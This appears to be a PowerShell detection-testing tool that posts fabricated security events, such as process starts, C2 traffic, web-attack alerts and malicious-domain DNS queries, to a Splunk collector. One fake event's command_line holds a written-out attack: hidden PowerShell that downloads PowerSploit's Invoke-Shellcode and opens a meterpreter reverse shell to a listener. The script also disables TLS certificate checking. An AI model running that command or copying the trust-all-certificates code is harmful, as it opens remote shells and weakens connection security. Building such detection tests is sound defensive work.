$MenuIcon = '
   _________             .__         ___________             .__          __                
  /   _____/ ____   ____ |__| ____   \_   _____/ _____  __ __|  | _____ _/  |_  ___________ 
  \_____  \ /  _ \ /    \|  |/ ___\   |    __)_ /     \|  |  \  | \__  \\   __\/  _ \_  __ \
  /        (  <_> )   |  \  \  \___   |        \  Y Y  \  |  /  |__/ __ \|  | (  <_> )  | \/
 /_______  /\____/|___|  /__|\___  > /_______  /__|_|  /____/|____(____  /__|  \____/|__|   
  \/            \/        \/          \/      \/                \/                   
==============================================================================================
'
#Trust all certs
Add-Type -TypeDefinition @'
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
'@

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::CertificatePolicy = New-Object -TypeName TrustAllCertsPolicy

#Compile list of domains for randomization
$MaliciousDomainList = @(
  'differentia.ru',
  'badwebsite.su',
  'malicious.cn',
  'posqit.net',
  'martiq.org',
  'sucuritester.com',
  'milos.hostelbobi.com'
)

#Grabs list of IPs from IPABUSE for randomization
if($IPList -eq $null){
  $IPList = (Invoke-WebRequest -Uri https://www.abuseipdb.com/sitemap).Links.InnerHTML -match '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
}

#Create Static Web Port list
$WebPortList = @(
  '80',
  '443',
  '8080'
)

#Action List for Randomization
$ActionList = @(
  'blocked',
  'allowed'
)

$IPSSignatures = @(
  'SQL Injection',
  'ThinkPHP Remote Code Execution Vulnerability',
  'Directory Traversal',
  'HTTP Directory Traversal Vulnerability',
  'HTTP Cross Site Scripting Vulnerability',
  'Gif Image Malicous Imagedescriptor Width and Height Anomaly'
)

#Static Port Range for Randomization
$StaticPortRange = 1..1024

#Dynamic Port Variable for Randomization
$DynamicPortRange = 49152..65535

#Create JSON bodies for sending to splunk
#Splunk Arbitration Execution
$PowershellArbEvent = 'ConvertTo-Json -InputObject @{ 
  host= "cbserver"
  sourcetype="bit9:carbonblack:json";
  event = @{ 
  is_process= "proc";
  cb_server= "cbserver";
  command_line = "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -nop -noexit -executionpolicy bypass -c IEX ((New-Object Net.WebClient).DownloadString(https=//raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1)); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 192.168.80.129 -Lport 4444 -Force";
  computer_name = "$ComputerName";
  event_type = "proc";
  expect_followon_w_md5= "false";
  filtering_known_dlls= "false";
  md5= "95000560239032BC68B4C2FDFCDEF913";
  parent_create_time= (Get-Date (Get-Date).ToUniversalTime() -UFormat %s) - 600;
  parent_guid= "-5247729666896787000";
  parent_md5= "9A68ADD12EB50DDE7586782C3EB9FF9C";
  parent_path= "c:\windows\system32\wscript.exe";
  parent_pid= "3724";
  parent_process_guid= "00000010-0000-0e8c-01d5-f07419d75576";
  parent_sha256= "62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED";
  path= "c:\windows\system32\windowspowershell\v1.0\powershell.exe";
  pid= "5320";
  process_guid= "00000010-0000-14c8-01d5-f07419f8eb97";
  process_path= "c:\windows\system32\windowspowershell\v1.0\powershell.exe";
  sensor_id= "16";
  sha256= "D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677";
  timestamp= Get-Date (Get-Date).ToUniversalTime() -UFormat %s;
  type= "ingress.event.procstart";
  uid= "S-1-5-21-2977773840-2930198165-1551093962-1202";
  username= "Badlarry";
  };
} -Compress'
      
# Inbound Web Attack JSON
$InboundWebAttacks = 'ConvertTo-Json -InputObject @{
  host = "192.168.1.253";
  sourcetype = "Powershell_IDS";	
  event = @{	
  action = Get-Random $ActionList;
  threat_category = "code-execution";
  dest_ip = "212.36.195.250";
  dest_translated_ip = "212.36.195.250";
  dest_port = Get-Random  $WebPortList;
  host = "192.168.1.253";	
  file_name = "index.php";
  threat_signature = Get-Random $IPSSignatures;
  src_ip = Get-Random $IPList; 
  user = "Badlarry";
  version = "newest"
  type = "Inbound Attack"
  ids = "network"
  threat_severity = "critical"
  }
}'


# Command and Control Traffic based on Threat Intelligence  
$C2Event = 'ConvertTo-Json -InputObject @{  
  host = "Palo Alto";
  sourcetype = "pan:traffic";
  event = @{
  action = "allowed";
  app = "ssl" ;
  bytes = "12984";
  bytes_in = "8448";
  bytes_out = "4536";
  dest = Get-Random $IPList;
  dest_interface = "ethernet1/1";
  dest_ip = Get-Random $IPList;
  dest_port = Get-Random $StaticPortRange;
  dest_translated_ip = Get-Random $IPList;
  dest_translated_port = "443";
  dest_zone = "Untrust-L3";
  duration = "7";
  dvc = "192.168.1.253";
  is_Traffic_By_Action = "1";
  is_not_Traffic_By_Action = "0";
  packets = "26";
  packets_in = "12";
  packets_out = "14";
  process_hash = "unknown";
  rule = "All Traffic";
  session_id = "16646";
  src = "192.168.1.36";
  src_interface = "vlan";
  src_ip = "192.168.1.36";
  src_port = Get-Random -InputObject $DynamicPortRange;
  src_translated_ip = "212.36.195.250";
  src_translated_port = "30429";
  src_zone =" Trust-L3";
  transport = "tcp";
  user = "Badlarry";
  vendor_product = "Palo Alto Networks Firewall";
  }
} -Compress'
 

# Inbound Web Attack JSON
$DNSQueries = 'ConvertTo-Json -InputObject @{
  host = "Awesome DNS Server";
  sourcetype = "Powershell_DNS";	
  event = @{
    #additional_answer_count = "";
    #authority_answer_count  = "";
    #dest_bunit              = "";
    #dest_category           = "";
    dest_port               = "53";
    #dest_priority           = "";
    #duration                = "";
    #name                    = "";
    query_type              = "A";
    record_type             = "Q";
    #response_time           = "";
    src                     = "192.168.1.37";
    #src_bunit               = "";
    #src_category            = "";
    src_port                = Get-Random $DynamicPortRange;
    #src_priority            = "";
    #tag                     = "";
    #transaction_id          = "";
    transport               = "UDP";
    ttl                     = Get-Random -Maximum 10;
    answer                  = "";
    dest                    = "192.168.1.34";
    message_type            = "QUERY";
    query                   = Get-Random $MaliciousDomainList;
    reply_code_id           = "QZ";
    #Lookup                  = "";
    reply_code              = "NOERROR";
    vendor_product          = "Really Amazing Name Service";
  }
} -compress '




function Start-SplunkIncidentEmulation {
  param(
    [CmdletBinding(SupportsShouldProcess = $True)]
    [ValidateSet('PwshArbitraryCommandExecution', 'PhoneHomeIntelligence', 'InboundWebAttacks','DNSQueries')]
    [Parameter()]
    [string]$Emulation,
    [String]$ComputerName,
    [Parameter(Mandatory=$true)]
    [String]$SplunkIP,
    [Parameter(Mandatory=$true)]
    [String]$SplunkPort,
    [Parameter(Mandatory=$true)]
    [String]$Token,
    [String]$ExecutionCount
  )
  if($ExecutionCount -eq $null){
    $ExecutionCount -eq 1
  }
  #Compile hashtable to pull attack object using validation set
  $HashTableEmulationType = @{
    'PwshArbitraryCommandExecution' = $PowershellArbEvent
    'PhoneHomeIntelligence' = $C2Event
    'InboundWebAttacks' = $InboundWebAttacks
    'DNSQueries' = $DNSQueries
  }
    
  #Create Header to receive TOKEN
  $Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
  $Headers.Add("Authorization", "Splunk $Token")
  #Create Splunk Server variable to hand IP and Port
  $SplunkServer = "https://{0}:{1}/services/collector/event" -f $SplunkIP,$SplunkPort
  $ExecutionIteration = 0
    
  while($ExecutionIteration -lt $ExecutionCount){
    $Event = Invoke-Expression ($HashTableEmulationType[$Emulation])
    #$Event
    $Result = Invoke-RestMethod -Uri $SplunkServer -Method Post -Headers $headers -Body $Event
    Write-Host "[Emulation Complete] Status:"$Result.text -ForegroundColor Green
    $ExecutionIteration++
  }
}
 
function Start-SonicEmulator {
  # Please declare your variables here
  $SplunkServer = 'IP'
  $SplunkPort = 'PORT'
  $Token = 'TKEN'
   
  $Prompt =
  "Write-Host '<=So' -ForegroundColor Yellow -NoNewline; Write-Host 'nic' -ForegroundColor Red -NoNewline; Write-Host 'Emu=>' -ForegroundColor Blue -NoNewline"
  #while ($SplunkServer -or $SplunkPort -or $Token -eq $null){
  #  "We have detected null values in your splunk server variable set, please fill the following variables so that we may begin testing"
  #  $SplunkServer = Read-Host "(Splunk Server IP)"
  #  $SplunkPort = Read-Host  "(Splunk Server Port)"
  #  $Token = Read-Host "(Token)"
     #}
   :outer while($true){
     Clear
     $MenuIcon
     Write-Host '+ 0       - Total Emulation              '
     Write-Host '+ 1       - Endpoint Techniques          '
     Write-Host '+ 2       - Inbound Attacks              '
     Write-Host '+ Exit    - exits from the script        '  
     Write-Host '+ Credits - Authors                      '
     Invoke-Expression ($Prompt)
     $Choice = Read-Host
     if ($Choice -eq 0){
       Write-Host "[Starting Powershell-Based Attacks]" -ForegroundColor Yellow
       Start-SplunkIncidentEmulation -SplunkIP:$SplunkServer -SplunkPort:$SplunkPort -Token:$Token -ComputerName:$ComputerName -Emulation PwshArbitraryCommandExecution -ExecutionCount 1
       Write-Host "[Starting C2 Emulation]" -ForegroundColor Yellow
       Start-SplunkIncidentEmulation -SplunkIP:$SplunkServer -SplunkPort:$SplunkPort -Token:$Token -ComputerName:$ComputerName -Emulation PhoneHomeIntelligence -ExecutionCount 50
       Read-Host 
     }
   }
 }
